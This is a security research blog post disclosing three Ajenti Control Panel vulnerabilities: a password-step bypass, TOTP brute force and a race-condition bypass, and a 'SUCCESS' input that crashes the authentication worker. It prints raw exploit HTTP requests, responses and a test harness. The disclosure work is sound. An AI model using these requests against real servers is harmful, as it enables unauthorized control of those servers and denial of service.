---
title: "Case study: Ajenti Control Panel"
date: 2026-01-21 11:00:00 +0800
categories: [Case study]
tags: Race-Condition Authentication-Bypass DoS
---

The new "Case study" blog series is aimed to present security research for a particular software, protocol or system.
Its purpose is to demonstrate how a single, average but a dedicated attacker might approach and dismantle a certain high profile attack surface. The blog series will focus on critical issues, such as pre authentication and privilege escalation vulnerabilities.

The first blog in the series relates to [Ajenti Control Panel](https://github.com/ajenti/ajenti), a Python based server admin panel designed to be run on Linux systems. It's used to administer servers, deploy websites and much more. The identified and disclosed vulnerabilities include:

- CVE-2026-XXXXX - Password based authentication bypass by doing nothing at all
- CVE-2026-XXXXX - Two ways to bypass Two Factor Authentication
- CVE-2026-XXXXX - Unauthenticated single request Denial of Service

### Bypass password-based authentication by doing nothing at all

While doing pre-authentication vulnerability research, it is only naturally to take a look how the authentication is implemented. It was determined that a few logic issues exist, which result in authentication bypass. Let's dig deeper how we can bypass password requirement completely.

The following code is responsible for the first step of the auth flow, the password input:

```python
 @post('/api/core/auth')
    @endpoint(api=True, auth=False)
    def handle_api_auth(self, http_context):
        body_data = json.loads(http_context.body.decode())
        mode = body_data['mode']
        username = body_data.get('username', None)
        password = body_data.get('password', None)

        auth = AuthenticationService.get(self.context)
        user_auth_id = f'{username}@{auth.get_provider().id}'

        if mode == 'normal':
            auth_info = auth.check_password(username, password)
            if auth_info:
                if aj.tfa_config.data.get(user_auth_id, {}).get('totp', []):
                    return {
                        'success': True,
                        'username': username,
                        'totp': True
                    }

                auth.prepare_session_redirect(http_context, username, auth_info)
                return {
                    'success': True,
                    'username': username,
                }
```

The client-side sends the JSON `mode` parameter, which will be set to `normal` in the first step. The backend checks if the credentials supplied are correct. If they are, and if the TFA is activated for the user, the JSON message returned:

```
{
  'success': True,
  'username': username,
  'totp': True
}
 ```

Note, that the backend doesn't return any unique token, proving that the user correctly passed this step. This is an indication of the password check, implemented on the client-side - but only when the TFA is activated for the user. This in turn means, that user's security is lowered if they have multi factor authentication implemented.

Let's confirm the issue and check how the second step of the authentication flow (TFA) is implemented:

```python
elif mode == 'totp':
            # Reset verify value before verifying
            aj.tfa_config.verify_totp[user_auth_id] = None
            self.context.worker.verify_totp(user_auth_id, password)
            gevent.sleep(0.3)
            if aj.tfa_config.verify_totp[user_auth_id]:
                auth.prepare_session_redirect(http_context, username, None)
                return {
                    'success': True,
                    'username': username,
                }
```

From the above snippet, we can see that `verify_totp` method takes `user_auth_id` (username) and a `password` information. Let's try to send username and OTP directly to this endpoint:

Consume second step of the auth flow directly:

```http
POST /api/core/auth HTTP/1.1
Host: 192.168.1.10:8000
Cookie: session=de50b2c5b7e1aac64c06284fcef8208e608b8aefa4c6c4452f0c4ac80dcbc752
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/json;charset=utf-8
Content-Length: 55
Origin: https://192.168.1.10:8000
Referer: https://192.168.1.10:8000/view/login/normal//view/totp
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=0
Te: trailers
Connection: keep-alive

{"username":"debian","password":"108017","mode":"totp"}

```

Response:

```http
HTTP/1.1 200 
X-Auth-Identity: 
X-Session-Redirect: debian
X-Auth-Info: None
Content-Type: application/json
X-Worker-Name: restricted session
Set-Cookie:  session=17c45c417adae0b7df4dff2bbfccdcac2466b82e696b2c4549f39cfa3a02fc2f; HttpOnly; Path=/
Date: Wed, 14 Jan 2026 11:18:33 GMT
Content-Length: 39

{"success": true, "username": "debian"}
```

Attacker can retrieve the session with only TFA code and username, without valid password.

### Two ways to bypass Two Factor Authentication

The first way is a bit boring - by brute forcing. Since the second factor is a Google TOTP, a 6 digit number; it is therefore to trivially brute force it in a reasonable time (at most a few days). Nothing in the Ajenti's code prevents attackers from doing so, appart from a small friction posed by the greenlet delay, after the TFA code check

```
self.context.worker.verify_totp(user_auth_id, password)
gevent.sleep(0.3)
```

This won't prevent brute force, as the delay is present only for the current request. This means, attacker can send many requests per second, each being delayed for a fraction of a second. It won't be enough to prevent a brute force attack, however it will only slightly delay response for each of the requests.

### TFA bypass via race condition

The second way to bypass TFA is with style. Let's unpack the entire TFA code check:

```python
        elif mode == 'totp':
            # Reset verify value before verifying
            aj.tfa_config.verify_totp[user_auth_id] = None
            self.context.worker.verify_totp(user_auth_id, password)
            gevent.sleep(0.3)
            if aj.tfa_config.verify_totp[user_auth_id]:
                auth.prepare_session_redirect(http_context, username, None)
                return {
                    'success': True,
                    'username': username,
                }
        return {
            'success': False,
            'error': 'Invalid mode',
        }
```
The `aj.tfa_config.verify_totp[user_auth_id] = None` will set a specific user's TFA state to `None` at the elif block entry. Then, the actual verification is happening within `worker.verify_totp` call. Finally, we can assume this call is setting the `tfa_config.verify_totp[user_auth_id]` separately as it is later verified. The same variable is finally checked and depending on it, the user's session is returned to the client. Alternatively, authentication attempt fails.

The `worker.verify_totp` function definition sends the TFA code and username to upstream reader:

```python
    def verify_totp(self, userid, code):
        self.send_to_upstream({
            'type': 'verify-totp',
            'userid': userid,
            'code': code,
        })
```

Upstream reader implementation:

```python
 def _stream_reader(self):
...
 <SNIPPED_FOR_CLARITY>
...

    if resp.object['type'] == 'verify-totp':
                    self.gateway_middleware.verify_totp(
                        resp.object['userid'],
                        resp.object['code'],
                        self.session.key
                    )

...
 <SNIPPED_FOR_CLARITY>
...
```

The usptream reader forwards the authentication info to the middleware worker, with the session key. I think this session key is responsible to distinct that the message came from the ajenti subprocess, which will always be correct in our case.

The middleware `verify_totp` implementation:

```python
   def verify_totp(self, userid, code, session_key):
        if session_key == self.key:
            self.restricted_gate.verify_totp(userid, code)
        for session in self.sessions.values():
            if not session.is_dead() and session_key == session.key:
                session.gate.verify_totp(userid, code)
```

Middleware is esentially a wrapper which calls `gate.verify_totp`:

```python
    def verify_totp(self, userid, code):
        secrets = aj.tfa_config.get_user_totp_secrets(userid)
        user = userid.split('@')[0]
        for secret in secrets:
            if TOTP(user, secret).verify(code):
                self.stream.send({
                    'type': 'verify-totp',
                    'data': {'result': True, 'userid': userid}
                })
                return
        self.stream.send({
            'type': 'verify-totp',
            'data': {'result': False, 'userid': userid}
        })
```

This is the actual TFA code check. The result (boolean) is sent upstream to `worker.py`, where the result is caught:

```python
        if rq.object['type'] == 'verify-totp':
                    userid = rq.object['data']['userid']
                    result = rq.object['data']['result']
                    aj.tfa_config.verify_totp[userid] = result
```

The TFA result is stored within the `aj.tfa_config.verify_totp` array, which holds authentication attempt results for all users.

<span style="color:orange;">And this is the exact point where the vulnerability is introduced.</span> Notice, that the `aj.tfa_config.verify_totp[userid]` is set within the separate worker and this variable is shared. This array is checked before giving the session to the user. Race condition is therefore a possibility, because this variable assignment is done without restrictions asynchronously and in a separate worker thread.

Once the legitimate user logs in, the TFA state for them will be set to `True` for a short period of time. This in turn means, that if the attacker is constantly trying to brute-force the TFA code (by abusing the first way to bypass it), they will guess the TFA code also when the legit user provides it.

Let's demonstrate the TFA brute-force attempt, while the legitimate user is separately logging in and providing the correct TFA value:

<img width="1171" height="815" alt="Image" src="https://github.com/user-attachments/assets/6776b700-7f69-4139-95f7-b085f6ac3093" />

While the user's TFA state is True (legitimate user logs in), attacking TFA code attempts will all be successful in this short time period. This allows more effective brute-force attack for a complete authentication bypass.

The ajenti control panel allows all users to execute commands as a part of intented functionality, so authentication bypass is a full system compromise and allows network pivot.

This extremely similar example is explained more deeply by Portswigger in the [Race Condition blog post](https://portswigger.net/web-security/race-conditions).

### Unauthenticated single request Denial of Service

Lastly, it was determined that a single HTTP request can crash authentication worker, causing DoS.

The following code is interesting, as it is responsible for default username and password, single factor authentication:

```python
    def authenticate(self, username, password):
        child = None

        from shlex import quote

        try:
            child = pexpect.spawn(
                '/bin/sh',
                ['-c', f'/bin/su -c "/bin/echo SUCCESS" - {quote(username)}'],
                timeout=25
            )
            child.expect([
                b'.*:', # normal colon
                b'.*\xef\xb9\x95', # small colon
                b'.*\xef\xbc\x9a',  # fullwidth colon
            ])
            child.sendline(password)
            result = child.expect(['su: .*', 'SUCCESS'])
        except pexpect.exceptions.EOF as err:
            logging.error(f'Login error: {child.before.decode().strip()}')
            if child and child.isalive():
                child.close()
            return False
        except Exception as err:
            if child and child.isalive():
                child.close()
            logging.error(f'Error checking password: {err}')
            return False
        if result == 0:
            return False
        return True
```

It was determined, that the logic of this code is flawed. The `SUCCESS` message should be printed to the output buffer, only when `su` gets supplied correct username and password.

Let's see how attackers can manipulate this function to force the `True` return value.

The following short harness helper script was used to help out with local testing:

```python
#!/usr/bin/env python3
import sys
import logging
import pexpect
from shlex import quote

logging.basicConfig(level=logging.DEBUG)

def check_password(username, password):
    child = None
    try:
        child = pexpect.spawn(
            '/bin/sh',
            ['-c', f'/bin/su -c "/bin/echo SUCCESS" - {quote(username)}'],
            timeout=25,
            encoding=None  # keep bytes, matches your code
        )

        child.expect([
            b'.*:',          # normal colon
            b'.*\xef\xb9\x95',  # small colon
            b'.*\xef\xbc\x9a',  # fullwidth colon
        ])

        child.sendline(password)

        result = child.expect(['su: .*', 'SUCCESS'])

    except pexpect.exceptions.EOF as err:
        logging.error(f'Login error: {child.before.decode(errors="ignore").strip()}')
        if child and child.isalive():
            child.close()
        return False

    except Exception as err:
        if child and child.isalive():
            child.close()
        logging.error(f'Error checking password: {err}')
        return False

    if child and child.isalive():
        child.close()

    if result == 0:
        return False

    return True


if __name__ == "__main__":
    if len(sys.argv) != 3:
        print(f"Usage: {sys.argv[0]} <username> <password>")
        sys.exit(1)

    username = sys.argv[1]
    password = sys.argv[2]

    ok = check_password(username, password)

    print("AUTH OK" if ok else "AUTH FAIL")
```

<img width="990" height="185" alt="Image" src="https://github.com/user-attachments/assets/ed8cd072-040e-4579-8856-069051f98263" />

Interestingly, we can see that it is possible to authenticate using username or password set as `SUCCESS`. Weird, however let's understand and see why that works.

`python3 harness.py SUCCESS test`

```bash
debian@debian:~$ python3 harness.py SUCCESS test
<pexpect.pty_spawn.spawn object at 0x7fab44bfc590>
command: /bin/sh
args: ['/bin/sh', '-c', '/bin/su -c "/bin/echo SUCCESS" - SUCCESS']
buffer (last 100 chars): b' user SUCCESS does not exist or the user entry does not contain all the required fields\r\n'
before (last 100 chars): ''
after: b'su:'
match: <re.Match object; span=(0, 3), match=b'su:'>
AUTH OK

```

We can see that buffer (last 100 chars) contains the word `SUCCESS`, as we specified it in the username.

The following code is responsible for returning the boolean, authentication attempt result:

`result = child.expect(['su: .*', 'SUCCESS'])`

Because output buffer will match the intended `su: .*` regex, and it contains `SUCCESS` message ('SUCCESS' isn't a valid OS user), the method returns `True` without correct credentials.

<img width="832" height="36" alt="Image" src="https://github.com/user-attachments/assets/4978b915-0cfb-4d7e-9ce9-c058f9e551e9" />

You might be wondering, how is this not an authentication bypass, but only a DoS. Let's dig a bit deeper and send a malicious login request:

```http
POST /api/core/auth HTTP/1.1
Host: 192.168.1.10:8000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/json;charset=utf-8
Content-Length: 56
Origin: https://192.168.1.10:8000
Referer: https://192.168.1.10:8000/view/login/normal//view/iptables
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=0
Te: trailers
Connection: keep-alive

{"username":"aaaa","password":"SUCCESS","mode":"normal"}

```

The response yields success message, with set-cookie header:

```http
HTTP/1.1 200 
X-Auth-Identity: 
X-Session-Redirect: aaaa
X-Auth-Info: True
Content-Type: application/json
X-Worker-Name: restricted session
Set-Cookie:  session=d8752000ff4d7b9ff197cafc0eea54c2d7a412737fa7cb3df9fbc69a2e00d1ac; HttpOnly; Path=/
Date: Wed, 14 Jan 2026 17:02:55 GMT
Content-Length: 37

{"success": true, "username": "aaaa"}
```

However, the background greenlet crashed. The log outputs:

```
Jan 14 18:03:31 debian python3[78358]:   File "/usr/local/lib/python3.13/dist-packages/aj/auth.py", line 230, in login
Jan 14 18:03:31 debian python3[78358]:     uid = self.get_provider().get_isolation_uid(username)
Jan 14 18:03:31 debian python3[78358]:   File "/usr/local/lib/python3.13/dist-packages/aj/auth.py", line 156, in get_isolation_uid
Jan 14 18:03:31 debian python3[78358]:     return pwd.getpwnam(username).pw_uid
Jan 14 18:03:31 debian python3[78358]:            ~~~~~~~~~~~~^^^^^^^^^^
Jan 14 18:03:31 debian python3[78358]: KeyError: "getpwnam(): name not found: 'aaaa'"
```

The function `getpwnam()` returns uncaught exception, as the OS username is not found. This will crash the greenlet and cause failure for all further authenticated requests.

Unfortunately for the attacker, it is not possible to re-use the retrieved session, as the background worker is no longer alive to process authenticated requests. The Ajenti Control Panel needs to be fully restarted, thus the sessions will be flushed from the memory, making the previously returned sessions invalid.